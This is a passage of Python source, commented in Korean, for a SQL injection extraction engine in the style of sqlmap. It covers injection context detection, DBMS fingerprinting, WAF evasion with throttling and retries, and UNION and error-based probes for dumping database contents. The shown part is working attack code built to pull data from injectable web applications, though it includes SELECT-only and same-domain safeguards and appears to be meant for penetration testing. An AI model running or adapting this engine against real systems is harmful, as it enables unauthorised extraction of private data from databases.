"""
SQLi 데이터 추출 엔진
==============================================================================
탐지 모듈(sql_injection.py)과 분리된 별도 모드로, sqlmap 동작 방식을 참고하여
Error-based / Boolean-blind / UNION-based 3종 기법으로 SELECT 전용 추출을 수행한다.

핵심 정책:
- 모든 요청은 단일 직렬(sequential)로 전송됨
- INSERT/UPDATE/DELETE/DROP/SET 등 데이터·세션 변조 구문 절대 미사용
- DBMS 지원: MySQL / MariaDB / MSSQL / PostgreSQL / Oracle / SQLite
- Body 형식: form / json / xml (XML은 vuln_param을 CDATA로 자동 wrapping)
- 결과는 DB별 .xlsx 파일로 저장 (시트=테이블, INFO 시트 별도)
"""
import base64
import os
import re
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlunparse, urlencode

import requests
import urllib3

# SQLi 공통 상수·헬퍼
from modules._sqli_util import (
    WAF_KEYWORDS,
    DBMS_ERROR_VECTORS,
    DB_ERROR_SIGNATURES,
    apply_dynamic_mask,
    similarity,
    build_dynamic_contexts,
    gen_marker,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── 상수 ────────────────────────────────────────────────────────────────────

# WAF 결합 검출용 status code (body 키워드와 OR 결합)
WAF_STATUS_CODES = frozenset({403, 406, 419, 429, 503})

# UNION-based visible 컬럼 마커 — 응답 본문에서 추출값을 격리
# SecTest prefix로 응답 디버깅 시 도구 흔적 즉시 식별 가능. _char_encode_str로 CHAR/CHR
# 인코딩되어 페이로드엔 평문 노출 안 됨. UNION은 EXTRACTVALUE 같은 byte 제한 없어 안전.
UNION_MARK_S = "SecTestS"
UNION_MARK_E = "SecTestE"

# Row dump 컬럼 구분자 — 응답 본문에 자연 발생할 가능성이 매우 낮은 마커
DUMP_DELIM = "qDLMTRq"

# Row dump 행 구분자 — UNION 묶음 추출 시 여러 행을 한 셀에 결합
ROW_DELIM = "qROWMTRq"

# Boolean-blind true/false 판정 임계값 (_similarity 결과)
BLIND_SIM_THRESHOLD = 0.95

# fingerprint 단계 delay 최소값 — WAF 트리거 방지 (0.3s 강제)
FINGERPRINT_DELAY_FLOOR = 0.3

# 사용자 에러 메시지용 기법 표시명
_TECHNIQUE_LABELS: Dict[str, str] = {
    "error":   "Error",
    "boolean": "Boolean",
    "union":   "UNION",
}

# 컨텍스트 자동 탐지 후보 (우선순위 순) — 마지막 빈 문자열은 numeric 컨텍스트
CONTEXT_CANDIDATES = ["'", '"', "')", '")', "'))", ")", ""]

# DBMS별 식별자 quoting (좌, 우)
QUOTE_CHARS = {
    "MySQL":      ("`", "`"),
    "MariaDB":    ("`", "`"),
    "MSSQL":      ("[", "]"),
    "PostgreSQL": ('"', '"'),
    "Oracle":     ('"', '"'),
    "SQLite":     ('"', '"'),
}

# DBMS별 HEX 인코딩 함수 — multi-byte 안전 추출
HEX_FUNCS = {
    # CAST to string 먼저 — 정수 입력 시 HEX(int)가 odd-length numeric hex를 반환하는 버그 방지
    "MySQL":      "HEX(CAST({} AS CHAR))",
    "MariaDB":    "HEX(CAST({} AS CHAR))",
    # NVARCHAR(MAX)로 변환 후 varbinary — Unicode 보존 + 정수 타입 mismatch 해소
    "MSSQL":      "master.dbo.fn_varbintohexstr(CAST(CONVERT(NVARCHAR(MAX),{}) AS varbinary(MAX)))",
    # ::TEXT 경유 — int 직접 ::bytea 캐스팅 불가 해소
    "PostgreSQL": "ENCODE(({})::TEXT::bytea,'hex')",
    # TO_CHAR로 명시 변환 — NUMBER 직접 UTL_RAW.CAST_TO_RAW 인수로 넘길 때 타입 오류 해소
    "Oracle":     "RAWTOHEX(UTL_RAW.CAST_TO_RAW(TO_CHAR({})))",
    "SQLite":     "HEX({})",  # SQLite는 numeric을 TEXT 자동 변환하므로 수정 불필요
}

# DBMS별 길이/substr/ascii 함수
DBMS_FUNCS = {
    "MySQL":      {"length": "LENGTH", "substr": "SUBSTRING", "ascii": "ASCII"},
    "MariaDB":    {"length": "LENGTH", "substr": "SUBSTRING", "ascii": "ASCII"},
    "MSSQL":      {"length": "LEN",    "substr": "SUBSTRING", "ascii": "ASCII"},
    "PostgreSQL": {"length": "LENGTH", "substr": "SUBSTRING", "ascii": "ASCII"},
    "Oracle":     {"length": "LENGTH", "substr": "SUBSTR",    "ascii": "ASCII"},
    "SQLite":     {"length": "LENGTH", "substr": "SUBSTR",    "ascii": "UNICODE"},
}

# Error-based long string 추출 시 DBMS별 청크 hex 길이.
# 각 DBMS의 에러 메시지 출력 한계를 고려한 보수적 값 — 너무 크면 응답이 잘려 데이터 손실,
# 너무 작으면 요청 수 증가. MySQL/MariaDB는 EXTRACTVALUE의 32 byte 제한이 hard limit.
ERROR_CHUNK_HEX = {
    # EXTRACTVALUE 32 byte 한계: 0x7e(1) + ml(3) + mr(3) = 7자 오버헤드
    # 실 데이터 가용 25자 → 20 hex(=10 byte)으로 안전 마진 확보
    "MySQL":      20,
    "MariaDB":    20,
    "MSSQL":      200,   # CONVERT 에러는 nvarchar(4000) 수준 여유
    "PostgreSQL": 200,   # CAST 에러는 8KB+ 여유
    "Oracle":     200,   # UTL_INADDR/CTXSYS 에러 ~512 byte 한계 내 안전
    "SQLite":     30,    # error-based 사용성 낮음 — 보수적 유지
}

# 엑셀 sanitize 정규식 / 예약어
_INVALID_SHEET_CHARS = re.compile(r'[\\/*?:\[\]]')
_INVALID_FILE_CHARS  = re.compile(r'[\\/:\*\?"<>\|\x00-\x1f]')
_RESERVED_FILENAMES  = {"CON", "PRN", "AUX", "NUL",
                        *(f"COM{i}" for i in range(1, 10)),
                        *(f"LPT{i}" for i in range(1, 10))}
_FORMULA_PREFIX      = ("=", "+", "-", "@", "\t", "\r")
RESERVED_SHEETS      = {"INFO", "_TABLEMAP"}


# ── 예외 클래스 ─────────────────────────────────────────────────────────────

class WAFBlockedError(Exception):
    """WAF로 의심되는 응답이 감지되었을 때 발생한다."""


class UnsupportedTechniqueError(Exception):
    """현재 DBMS / 컨텍스트에서 선택한 기법을 사용할 수 없을 때 발생한다."""


# ── ExtractCtx ──────────────────────────────────────────────────────────────

@dataclass
class ExtractCtx:
    """추출 컨텍스트 — 단일 추출 세션의 모든 상태를 보관한다.

    allowed_netloc은 ExtractCtx 생성 시 1회 저장되어 _send의 사전·사후
    검증 모두 동일 기준으로 사용한다 (외부 도메인 유출 방어선).
    """
    # 사용자 입력 — 요청 구성
    target_url: str            # path까지의 URL (query string 자동 분리됨)
    allowed_netloc: str        # urlparse(target_url).netloc 1회 저장
    method: str                # "GET" | "POST"
    body_type: str             # "form" | "json" | "xml" (POST 시 의미)
    body_params: Dict[str, str]  # GET이면 query, POST면 body 파라미터
    vuln_param: str            # body_params 내 취약 파라미터 키
    timeout: int
    delay: float               # 요청 간 딜레이(초)
    cookies: Dict[str, str]
    technique: str             # "error" | "boolean" | "union"
    dbms: str                  # fingerprint 결과로 채워짐 (수동 지정 시 미리 채움)
    # 페이로드 종결 문자열. None=자동 탐지 트리거, ""=수동 numeric, "'"·'"'·"')"·"'))" 등=수동 명시
    quote_context: Optional[str]

    # 선택값 — default_factory 사용으로 mutable 공유 차단
    auth_headers: Dict[str, str] = field(default_factory=dict)
    proxies: Dict[str, str] = field(default_factory=dict)  # 프록시 설정 (BurpSuite 등)
    # True이면 페이로드(코드가 생성한 SQL 삽입문)만 Base64 인코딩 후 원본값에 append.
    # 파라미터 값이 Base64로 인코딩된 채로 서버에 전달되어야 하는 대상용.
    base64_encode: bool = False
    union_hex: bool = True
    union_columns: int = 0
    union_types: List[str] = field(default_factory=list)
    union_visible_idx: int = -1
    # 사용자 수동 지정 visible 컬럼 인덱스 (0-based). None이면 자동 탐지
    union_visible_manual: Optional[int] = None
    # UNION 행 묶음 크기 — 1이면 기존 1행씩, N이면 N행을 집계 함수로 한 요청에 추출
    union_row_batch: int = 1

    # Boolean-blind baseline 캐시
    baseline_resp_text: Optional[str] = None
    dynamic_contexts: List[Tuple[str, str]] = field(default_factory=list)
    waf_baseline_kws: List[str] = field(default_factory=list)
    # Dual baseline reference — _capture_baseline 시점에 채워짐.
    # 응답이 echo·다중 분기 등으로 baseline 단일 비교에서 noise가 크면 sqlmap 방식의
    # 양방향 비교(true_ref / false_ref 중 sim 큰 쪽으로 분류)가 더 안정적.
    true_ref_text: Optional[str] = None
    false_ref_text: Optional[str] = None

    # 내부 상태
    _session: Optional[requests.Session] = None
    cancelled: bool = False
    _throttle_retried: bool = False  # 429/503 자동 감속 1회 한정 플래그


# ── 세션 / 요청 헬퍼 ─────────────────────────────────────────────────────────

def _build_session(cookies: Optional[Dict[str, str]] = None,
                   auth_headers: Optional[Dict[str, str]] = None,
                   proxies: Optional[Dict[str, str]] = None,
                   ) -> requests.Session:
    """추출 모드 전용 requests.Session 생성.

    - verify=False (탐지 모듈과 동일 정책 — self-signed 환경 호환)
    - 쿠키와 인증 헤더(Authorization, X-API-Key 등)를 영구 부착
    - proxies가 전달되면 세션에 프록시 설정 (BurpSuite 등 인터셉트 프록시 연동)
    """
    s = requests.Session()
    s.verify = False
    if cookies:
        s.cookies.update(cookies)
    if auth_headers:
        s.headers.update(auth_headers)
    if proxies:
        s.proxies.update(proxies)
    return s


def _qid(ctx: ExtractCtx, name: str) -> str:
    """식별자 quoting + 내부 quote char 이스케이프.

    예: MySQL이면 `name` 형태, MSSQL이면 [name]. 컬럼/테이블/스키마명에 예약어·
    공백·특수문자가 포함되어도 안전하게 사용 가능.
    """
    l, r = QUOTE_CHARS[ctx.dbms]
    return l + name.replace(r, r + r) + r


def _decode_hex(dbms: str, hex_str: str) -> str:
    """DBMS별 HEX 결과를 문자열로 디코드.

    - MSSQL fn_varbintohexstr 결과는 '0x' prefix 포함 → strip 필요
    - MSSQL은 NVARCHAR→varbinary 변환으로 UTF-16 LE 바이트가 되므로 utf-16-le 디코드.
      부분 결과·timeout으로 잘린 경우 4의 배수(2바이트=4 hex chars=1 글자) 단위로 정렬
    - 그 외 DBMS는 utf-8 디코드. 홀수 길이면 마지막 1글자 절단 후 디코드
    - bytes.fromhex 실패 시 hex 원문을 그대로 반환 (사용자가 후처리 가능)
    """
    if not hex_str:
        return ""
    if dbms == "MSSQL" and hex_str.lower().startswith("0x"):
        hex_str = hex_str[2:]
    if dbms == "MSSQL":
        # UTF-16 LE: 한 글자 = 2바이트 = 4 hex chars — 4의 배수로 정렬
        trim = len(hex_str) % 4
        if trim:
            hex_str = hex_str[:-trim]
        try:
            return bytes.fromhex(hex_str).decode("utf-16-le", errors="replace")
        except ValueError:
            return hex_str
    # 그 외 DBMS — UTF-8
    if len(hex_str) % 2 == 1:
        hex_str = hex_str[:-1]
    try:
        return bytes.fromhex(hex_str).decode("utf-8", errors="replace")
    except ValueError:
        return hex_str


def _placeholder_literal(ctx: ExtractCtx, col_type: str = "") -> str:
    """UNION non-visible 컬럼 placeholder — 사용자 지정 타입별 더미 값.

    대상 앱이 결과 컬럼을 정수 등으로 파싱하는 환경에서 NULL(→ 빈 문자열)이
    FormatException 등 파싱 오류를 유발하는 것을 피하기 위해 타입별 더미를 채운다.
      - int/integer/numeric → 1
      - null              → NULL (기존 동작 유지)
      - string 또는 미지정  → 'a'
    MSSQL/PostgreSQL은 타입 명시 캐스트를 유지해 UNION 형식 충돌도 함께 방지한다.
    """
    t = (col_type or "").strip().lower()
    if t in ("int", "integer", "numeric"):
        if ctx.dbms == "MSSQL":      return "CAST(1 AS INT)"
        if ctx.dbms == "PostgreSQL": return "1::INTEGER"
        return "1"
    if t == "null":
        if ctx.dbms == "MSSQL":      return "CAST(NULL AS VARCHAR(MAX))"
        if ctx.dbms == "PostgreSQL": return "NULL::TEXT"
        return "NULL"
    # string 또는 미지정
    if ctx.dbms == "MSSQL":      return "CAST('a' AS VARCHAR(MAX))"
    if ctx.dbms == "PostgreSQL": return "'a'::TEXT"
    return "'a'"


def _dict_to_xml_cdata(params: Dict[str, str], vuln_key: str) -> str:
    """params dict를 평면 XML 트리로 조립. vuln_key 값은 CDATA로 감싸 페이로드 보호.

    CDATA 사용 이유: SQL 페이로드의 < > & 등 특수문자가 XML 파서에 의해 해석되어
    구문이 깨지는 것을 방지. 일반 필드는 그대로 두어 서버 파서 동작 보존.
    """
    parts = ["<root>"]
    for k, v in params.items():
        if k == vuln_key:
            parts.append(f"<{k}><![CDATA[{v}]]></{k}>")
        else:
            parts.append(f"<{k}>{v}</{k}>")
    parts.append("</root>")
    return "".join(parts)


def _is_waf_response(ctx: ExtractCtx, resp: requests.Response) -> bool:
    """WAF 결합 검출 — status code + body keyword 두 신호로 판정.

    1. status가 WAF_STATUS_CODES(403/406/419/429/503)에 속하면 즉시 의심
    2. body에 WAF 키워드가 있고, 해당 키워드가 ctx.waf_baseline_kws에 없으면 의심
       (baseline에 자연 발생한 키워드는 오탐 마스킹)
    """
    if resp.status_code in WAF_STATUS_CODES:
        return True
    body_lower = resp.text.lower()
    for kw in WAF_KEYWORDS:
        if kw in body_lower and kw not in ctx.waf_baseline_kws:
            return True
    return False


def _send(ctx: ExtractCtx, payload: str) -> requests.Response:
    """추출 모드 전용 요청 전송 — 사전/사후 netloc 검증 + WAF 가드 + 재시도.

    payload는 vuln_param의 원본 값에 append된다. body_type에 따라 form/json/xml로 분기.

    재시도 정책:
    - timeout / connection 오류: 1회 재시도
    - 429/503 응답: 1회 한정 delay 2배 + 재시도, 2회째에도 동일하면 WAFBlockedError
    """
    # 재시도 상태 추적 로컬 변수 (재귀 대신 루프로 처리)
    conn_retried = False

    while True:
        if ctx.cancelled:
            raise InterruptedError("user cancelled")
        time.sleep(ctx.delay)

        parsed = urlparse(ctx.target_url)
        # 사전 검증 — allowed_netloc 기준 (외부 도메인 페이로드 유출 차단)
        if parsed.netloc != ctx.allowed_netloc:
            raise ValueError(f"external domain blocked: {parsed.netloc}")

        # vuln_param 값에 페이로드 append (다른 파라미터는 원본 유지)
        # base64_encode=True이면 페이로드만 인코딩 후 원본값에 append
        encoded_payload = (base64.b64encode(payload.encode()).decode()
                           if ctx.base64_encode and payload else payload)
        injected = ctx.body_params[ctx.vuln_param] + encoded_payload
        body = dict(ctx.body_params)
        body[ctx.vuln_param] = injected

        try:
            if ctx.method == "GET":
                url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                  parsed.params, urlencode(body), parsed.fragment))
                resp = ctx._session.get(url, timeout=ctx.timeout, allow_redirects=True)
            else:  # POST
                url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
                if ctx.body_type == "json":
                    resp = ctx._session.post(url, json=body,
                                             timeout=ctx.timeout, allow_redirects=True)
                elif ctx.body_type == "xml":
                    xml_body = _dict_to_xml_cdata(body, ctx.vuln_param)
                    resp = ctx._session.post(url, data=xml_body,
                                             headers={"Content-Type": "application/xml"},
                                             timeout=ctx.timeout, allow_redirects=True)
                else:  # form
                    resp = ctx._session.post(url, data=body,
                                             timeout=ctx.timeout, allow_redirects=True)
        except (requests.Timeout, requests.ConnectionError):
            if conn_retried:
                raise
            conn_retried = True
            time.sleep(1.0)
            continue

        # 사후 검증 — redirect 후 외부 도메인 이탈 차단
        if urlparse(resp.url).netloc != ctx.allowed_netloc:
            raise ValueError(f"redirect to external domain: {urlparse(resp.url).netloc}")

        # 429/503 자동 감속 (1회 한정)
        if resp.status_code in (429, 503):
            if not ctx._throttle_retried:
                ctx._throttle_retried = True
                ctx.delay = min(ctx.delay * 2 if ctx.delay > 0 else 1.0, 5.0)
                time.sleep(ctx.delay)
                continue
            # 2회째도 rate limit → 추출 중단 신호
            raise WAFBlockedError(f"rate limit persisted (status={resp.status_code})")

        # WAF 결합 가드 (status + body keyword + baseline 마스킹)
        if _is_waf_response(ctx, resp):
            raise WAFBlockedError(f"WAF blocked (status={resp.status_code})")

        return resp


def _send_raw(ctx: ExtractCtx) -> requests.Response:
    """페이로드 없는 자연 요청 — Boolean baseline / WAF baseline 캡처용."""
    return _send(ctx, payload="")


def _send_fingerprint(ctx: ExtractCtx, payload: str) -> requests.Response:
    """fingerprint 전용 _send 래퍼 — delay 최소 0.3s 강제.

    fingerprint 단계는 컨텍스트 7~11종 × DBMS 식별 다중 probe로 짧은 시간에
    수십 요청이 발사되므로 사용자가 0.0s를 선택했어도 WAF 트리거 방지를 위해
    delay floor를 적용한다. 본 추출 단계는 사용자 delay 그대로 사용.
    """
    saved = ctx.delay
    ctx.delay = max(saved, FINGERPRINT_DELAY_FLOOR)
    try:
        return _send(ctx, payload)
    finally:
        ctx.delay = saved


# ── Boolean baseline 캡처 ───────────────────────────────────────────────────

def _capture_baseline(ctx: ExtractCtx) -> None:
    """페이로드 없는 원본 요청 2회 → baseline_resp_text + dynamic_contexts 채움.
    이어서 AND (1=1) / AND (1=0) reference 응답을 캡처해 dual baseline 비교에 사용.

    - 두 baseline 응답의 diff를 _build_dynamic_contexts로 분석하여 동적 콘텐츠
      (세션 ID/타임스탬프/nonce 등) 마스킹 컨텍스트 수집
    - WAF 오탐 방지: baseline에 자연 발생한 WAF 키워드는 ctx.waf_baseline_kws에 등록
    - true_ref / false_ref는 _blind_compare가 응답 분류에 사용 (단일 baseline보다
      noise에 강함). 캡처 실패(WAF 차단·예외) 시 None으로 둬 단일 baseline fallback.
    """
    r1 = _send_raw(ctx)
    r2 = _send_raw(ctx)
    ctx.baseline_resp_text = r1.text
    ctx.dynamic_contexts = build_dynamic_contexts(r1.text, r2.text)
    body_lower = r1.text.lower()
    ctx.waf_baseline_kws = [kw for kw in WAF_KEYWORDS if kw in body_lower]

    # true / false reference 캡처 — quote_context는 fingerprint 시점에 이미 결정됨
    try:
        true_resp = _send(ctx, _build_blind_compare_payload(ctx, "1=1"))
        ctx.true_ref_text = true_resp.text
    except Exception:
        ctx.true_ref_text = None
    try:
        false_resp = _send(ctx, _build_blind_compare_payload(ctx, "1=0"))
        ctx.false_ref_text = false_resp.text
    except Exception:
        ctx.false_ref_text = None


# ── DBMS / 컨텍스트 / UNION visible 자동 탐지 ───────────────────────────────

def _match_error_signature(body: str) -> Optional[str]:
    """응답 바디에서 DB 에러 시그니처를 탐색해 매칭된 DBMS명 반환."""
    for dbms, patterns in DB_ERROR_SIGNATURES.items():
        for pattern in patterns:
            if re.search(pattern, body, re.IGNORECASE):
                return dbms
    return None


def _detect_dbms(ctx: ExtractCtx) -> Optional[str]:
    """탐지 모듈의 시그니처/벡터를 재사용해 DBMS를 식별.

    Phase 1 (Generic): "'" 페이로드로 에러 시그니처 매칭 → 1차 식별
    Phase 2 (DBMS-specific): 식별된 DBMS의 DBMS_ERROR_VECTORS 마커 반사 확증
    실패 시 None 반환 (호출부가 사용자 수동 지정 메뉴 표시).
    """
    # Phase 1
    try:
        resp = _send_fingerprint(ctx, "'")
    except WAFBlockedError:
        raise
    except Exception:
        return None
    dbms = _match_error_signature(resp.text)
    if not dbms:
        return None

    # Phase 2 — DBMS-specific 마커 반사 확증
    if dbms in DBMS_ERROR_VECTORS:
        for vec in DBMS_ERROR_VECTORS[dbms]:
            marker = gen_marker()
            payload = " " + vec.replace("__MARKER__", marker)
            try:
                resp2 = _send_fingerprint(ctx, payload)
            except Exception:
                continue
            if marker in resp2.text:
                return dbms  # 데이터 유출 가능성 확정
            sig_dbms = _match_error_signature(resp2.text)
            if sig_dbms:
                return sig_dbms
    return dbms  # Phase 1만 매칭된 경우라도 그 결과 채택


def _detect_context(ctx: ExtractCtx) -> Optional[str]:
    """컨텍스트 자동 탐지 — CONTEXT_CANDIDATES 우선순위로 두 가지 판정 시도.

    ① Boolean 판정: AND 1=1 / AND 1=2 페어의 응답 차이가 크면 채택.
    ② 에러 전이 판정: Boolean이 실패할 때 후보를 단독 주입해 에러가 발생하고,
       정상 종결 시 에러가 사라지면 채택 (string 컨텍스트의 error-based 타겟 대응).
       numeric 후보(빈 문자열)는 단독 주입 페이로드가 없으므로 ② 판정 대상에서 제외.
    채택된 종결 문자열은 ctx.quote_context에 그대로 저장 (quote/suffix 분리 없음).
    모두 실패하면 None 반환 (호출부가 사용자 수동 모드 권장).
    """
    saved_baseline = ctx.baseline_resp_text
    saved_dyn      = ctx.dynamic_contexts
    saved_kws      = ctx.waf_baseline_kws

    for cand in CONTEXT_CANDIDATES:
        try:
            # 후보 컨텍스트 적용 — baseline은 후보별로 새로 캡처하지 않고 단순 비교
            ctx.quote_context = cand
            true_p  = f"{cand} AND 1=1 -- "
            false_p = f"{cand} AND 1=2 -- "
            r_true  = _send_fingerprint(ctx, true_p)
            r_false = _send_fingerprint(ctx, false_p)
        except WAFBlockedError:
            raise
        except Exception:
            continue

        sim = similarity(r_true.text, r_false.text)
        # ① Boolean 판정 — true와 false 응답이 명확히 갈리면 컨텍스트 후보 채택
        # (임계값은 자연 변동을 흡수하기 위해 0.95보다 약간 완화한 0.9)
        if sim < 0.9:
            return cand

        # ② 에러 전이 판정 — Boolean이 통하지 않는 error-based 타겟 대응
        # numeric 후보(빈 문자열)는 단독 주입 페이로드가 없으므로 스킵
        if not cand:
            continue
        # 정상 종결 응답에 에러가 없어야 의미 있는 전이 판정 가능
        if _match_error_signature(r_true.text) is not None:
            continue
        try:
            r_break = _send_fingerprint(ctx, cand)  # cand 단독 = 따옴표 미종결 상태
        except WAFBlockedError:
            raise
        except Exception:
            continue
        # 단독 주입 시 에러 발생 + 정상 종결 시 에러 소멸 → 컨텍스트 확정
        if _match_error_signature(r_break.text) is not None:
            return cand

    # 실패 — 컨텍스트 복원 후 None
    ctx.quote_context = ""
    ctx.baseline_resp_text = saved_baseline
    ctx.dynamic_contexts   = saved_dyn
    ctx.waf_baseline_kws   = saved_kws
    return None


def _char_encode_str(ctx: ExtractCtx, s: str) -> str:
    """문자열 리터럴을 DBMS별 인코딩 표현으로 변환.

    응답 echo로 입력 페이로드가 응답에 그대로 반사되는 환경에서도 marker가
    echo 영역에 평문으로 노출되지 않게 한다 — echo 영역엔 CHAR/CHR/hex 표현만
    남고, 실제 SQL 실행 결과로만 디코드된 marker가 응답에 나타나
    렌더링 영역과 echo 영역을 명확히 구분할 수 있다.
    """
    codes = [ord(c) for c in s]
    if not codes:
        return "''"
    if ctx.dbms in ("MySQL", "MariaDB", "SQLite"):
        # CHAR(n1,n2,...) — 가변 인수로 문자열 생성
        return f"CHAR({','.join(str(n) for n in codes)})"
    if ctx.dbms == "MSSQL":
        # T-SQL CHAR()는 인수 1개만 허용 — hex 리터럴로 대체
        # CHAR(n)+CHAR(n)+... 방식은 URL 인코딩 후 페이로드가 2배 이상 늘어
        # IIS maxQueryString(2048) 제한을 초과하므로 hex 바이너리 리터럴 사용
        hex_str = "".join(f"{c:02x}" for c in codes)
        return f"CAST(0x{hex_str} AS VARCHAR({len(s)}))"
    # PostgreSQL / Oracle: CHR(n)||CHR(n)||... 연결
    parts = [f"CHR({n})" for n in codes]
    if ctx.dbms == "PostgreSQL":
        # UNION 컬럼 타입 추론 안정화를 위해 ::TEXT 명시 캐스트
        return "(" + "||".join(parts) + ")::TEXT"
    return "(" + "||".join(parts) + ")"


def _build_union_visible_probe(ctx: ExtractCtx, target_idx: int) -> Tuple[str, str]:
    """UNION visible 컬럼 탐지용 단일-컬럼 페이로드 생성.

    target_idx 컬럼에만 sentinel-wrapped string 마커를 삽입하고 나머지는 모두 NULL로 채운다.
    마커를 SecTestS/SecTestE로 감싸면 SQL Server 에러 메시지에 값이 평문 노출되어도
    sentinel 쌍이 함께 나타나지 않아 언어 설정에 무관하게 오탐을 방지한다.
    NULL은 SELECT 결과 집합에만 적용되므로 NOT NULL 컬럼 제약과 무관하게 안전하다.
    """
    parts: List[str] = []
    mk = f"SecTestC{target_idx}"

    # 마커를 sentinel 쌍으로 감싼 DBMS별 연결 표현식 생성
    mark_s = _char_encode_str(ctx, UNION_MARK_S)
    mark_e = _char_encode_str(ctx, UNION_MARK_E)
    mk_enc = _char_encode_str(ctx, mk)
    if ctx.dbms in ("MySQL", "MariaDB"):
        probe_expr = f"CONCAT({mark_s},{mk_enc},{mark_e})"
    elif ctx.dbms == "MSSQL":
        probe_expr = f"({mark_s}+{mk_enc}+{mark_e})"
    else:
        # PostgreSQL / Oracle / SQLite
        probe_expr = f"{mark_s}||{mk_enc}||{mark_e}"

    for i in range(ctx.union_columns):
        if i == target_idx:
            # 탐지 대상 컬럼 — sentinel-wrapped 마커 삽입
            parts.append(probe_expr)
        else:
            # 나머지 컬럼 — 추출 페이로드와 동일하게 컬럼별 타입 더미 적용
            col_type = ctx.union_types[i] if i < len(ctx.union_types) else ""
            parts.append(_placeholder_literal(ctx, col_type))

    # AND 1=0으로 원본 row 제거 — UNION row가 첫번째로 렌더링되도록 함
    payload = f"{ctx.quote_context} AND 1=0 UNION SELECT {','.join(parts)} -- "
    # 응답에서 찾을 전체 패턴: 에러 메시지엔 값만 노출되고 sentinel 쌍은 포함되지 않음
    full_mk = UNION_MARK_S + mk + UNION_MARK_E
    return payload, full_mk


def _detect_union_visible(ctx: ExtractCtx) -> int:
    """UNION visible 컬럼 인덱스 탐지 — 컬럼별 개별 probe + sentinel 패턴 매칭.

    각 컬럼을 순서대로 단독으로 탐지한다:
    - SecTestS+mk+SecTestE 전체 패턴이 응답에 나타난 첫 번째 컬럼을 visible로 채택
    - 에러 메시지에 mk 값이 평문 노출되어도 sentinel 쌍이 없으면 오탐하지 않음

    탐지 실패 시 -1 반환 (호출부가 "UNION 사용 불가" 안내 + 다른 기법 권장).
    """
    for idx in range(ctx.union_columns):
        # 사용자가 명시적으로 null 타입을 지정한 컬럼은 탐지 대상 제외
        col_type = (ctx.union_types[idx] if idx < len(ctx.union_types) else "").strip().lower()
        if col_type == "null":
            continue
        payload, full_mk = _build_union_visible_probe(ctx, idx)
        try:
            resp = _send_fingerprint(ctx, payload)
        except WAFBlockedError:
            raise
        except Exception:
            continue
        # sentinel 쌍이 포함된 전체 패턴이 반사된 경우에만 visible로 채택
        if full_mk in resp.text:
            return idx
    return -1


def fingerprint(ctx: ExtractCtx,
                progress_cb: Optional[Callable[[int, int], None]] = None
                ) -> ExtractCtx:
    """컨텍스트와 DBMS를 식별하여 ctx를 갱신한다.

    technique은 fingerprint가 자동 선택하지 않는다 — 사용자 입력 시점에 이미
    ctx.technique에 저장되어 있으며, fingerprint는 해당 기법으로 추출이 가능한
    사전 조건만 검증한다.

    ctx.quote_context가 사용자 수동 지정값이면 컨텍스트 자동 탐지는 스킵.
    ctx.technique == "union"이면 ctx.union_visible_idx 자동 탐지도 함께 수행.
    SQLite + technique == "error"이면 UnsupportedTechniqueError를 raise.
    """
    total_steps = 5
    step = 0
    def _tick():
        nonlocal step
        step += 1
        if progress_cb:
            progress_cb(step, total_steps)

    # 1. 컨텍스트 자동 탐지 (None일 때만 자동 탐지, 빈 문자열은 수동 numeric 명시)
    if ctx.quote_context is None:
        detected = _detect_context(ctx)
        if detected is None:
            raise UnsupportedTechniqueError("컨텍스트 자동 탐지 실패 — 수동 지정 필요")
        ctx.quote_context = detected
    _tick()

    # 2. DBMS 식별 (사용자 수동 지정값이 있으면 스킵)
    if not ctx.dbms:
        dbms = _detect_dbms(ctx)
        if dbms is None:
            raise UnsupportedTechniqueError("DBMS 자동 식별 실패 — 수동 지정 필요")
        ctx.dbms = dbms
    _tick()

    # 3. SQLite + Error 사용자 선택 충돌 — 호출부가 재선택 메뉴 띄우도록 유도
    if ctx.dbms == "SQLite" and ctx.technique == "error":
        raise UnsupportedTechniqueError("SQLite는 Error-based 미지원")

    # 4. Boolean baseline 캡처 (Boolean 기법 선택 시에만 필요)
    if ctx.technique == "boolean":
        _capture_baseline(ctx)
    _tick()

    # 5. UNION visible 컬럼 탐지 (UNION 기법 선택 시)
    if ctx.technique == "union":
        if ctx.union_columns <= 0 or len(ctx.union_types) != ctx.union_columns:
            raise UnsupportedTechniqueError("UNION 컬럼 수/타입 입력 필요")
        # 수동 지정이 있으면 자동 탐지 스킵 (범위 검증은 app.py 입력 단계에서 완료)
        if ctx.union_visible_manual is not None:
            ctx.union_visible_idx = ctx.union_visible_manual
        else:
            ctx.union_visible_idx = _detect_union_visible(ctx)
            if ctx.union_visible_idx == -1:
                raise UnsupportedTechniqueError("UNION 기법으로 추출할 수 없습니다.")
    _tick()

    # 6. 기법별 실제 추출 가능성 smoke test — 마커/응답 반사 검증
    _label = _TECHNIQUE_LABELS.get(ctx.technique, ctx.technique)
    if ctx.technique == "error":
        # _error_extract로 1패킷 발사 — 마커가 응답에 반사되지 않으면 추출 불가
        try:
            _probe = _error_extract(ctx, "SELECT 1")
        except (WAFBlockedError, InterruptedError):
            raise
        except Exception:
            _probe = "skip"  # 네트워크 일시 오류 시 보수적 패스
        if _probe is None:
            raise UnsupportedTechniqueError(f"{_label} 기법으로 추출할 수 없습니다.")
    elif ctx.technique == "boolean":
        # true/false 응답 구분 검증 — 같으면 boolean 추출 불가
        try:
            _true_result  = _blind_compare(ctx, "1=1")
            _false_result = _blind_compare(ctx, "1=2")
        except (WAFBlockedError, InterruptedError):
            raise
        except Exception:
            _true_result, _false_result = True, False  # 네트워크 일시 오류 시 보수적 패스
        if _true_result == _false_result:
            raise UnsupportedTechniqueError(f"{_label} 기법으로 추출할 수 없습니다.")
    elif ctx.technique == "union":
        # visible 컬럼 탐지 통과 후 실제 추출 검증
        try:
            _probe = _union_extract(ctx, "SELECT 1")
        except (WAFBlockedError, InterruptedError):
            raise
        except Exception:
            _probe = "skip"  # 네트워크 일시 오류 시 보수적 패스
        if _probe is None:
            raise UnsupportedTechniqueError(f"{_label} 기법으로 추출할 수 없습니다.")
    _tick()

    return ctx


# ── Error-based 페이로드 / 추출 ─────────────────────────────────────────────

def _build_error_payload(ctx: ExtractCtx, query: str) -> Tuple[str, str, str]:
